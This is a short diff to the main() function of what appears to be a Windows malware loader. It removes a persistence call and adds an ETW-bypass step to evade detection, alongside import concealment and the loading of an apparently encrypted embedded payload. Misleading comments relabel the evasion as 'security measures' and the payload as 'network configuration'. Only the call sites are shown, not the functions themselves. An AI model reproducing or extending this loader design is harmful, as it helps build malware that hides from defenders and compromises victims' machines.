@@ -48,35 +48,34 @@ int main() {
     CreateDebugConsole();
 #endif
 
-    // Only keep persistence
-#ifdef DEBUG
-    PRINT("\n[*] Attempting to set persistence...\n");
-#endif
-
-    if (!XmSetPersistence()) {
-#ifdef DEBUG
-        PRINT("[!] Failed to set persistence - continuing anyway\n");
-#endif
-    }
-
-    // Original network initialization
-    PBYTE   resourceBuffer     = NULL,
-            processedBuffer    = NULL;
-    DWORD   resourceSize       = 0x00;
-
-    // Initialize network components
+    // Initialize network components first
     XmConcealImports();
     XmInitializeNetworkSubsystem();
 
-    // Setup network protocols
+    // Setup network protocols - MUST BE DONE BEFORE ETW BYPASS
     if (!XmInitializeNetworkProtocols(&g_NetworkConfig)) {
 #ifdef DEBUG
         goto _CLEANUP_RESOURCES;
 #endif 
         return -1;
     }
+
+    // Initialize ETW bypass after network protocols are setup
+#ifdef DEBUG
+    PRINT("\n[*] Initializing security measures...\n");
+#endif
+
+    if (!XmBypassEtwProtection()) {
+#ifdef DEBUG
+        PRINT("[!] Failed to initialize security measures - continuing anyway\n");
+#endif
+    }
     
     // Load network configuration
+    PBYTE   resourceBuffer     = NULL,
+            processedBuffer    = NULL;
+    DWORD   resourceSize       = 0x00;
+
     if (!XmFetchResourceData(GetModuleHandleH(NULL), CTAES_PAYLOAD_ID, &resourceBuffer, &resourceSize)) {
 #ifdef DEBUG
         PRINT("[!] Failed To Load Network Configuration - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
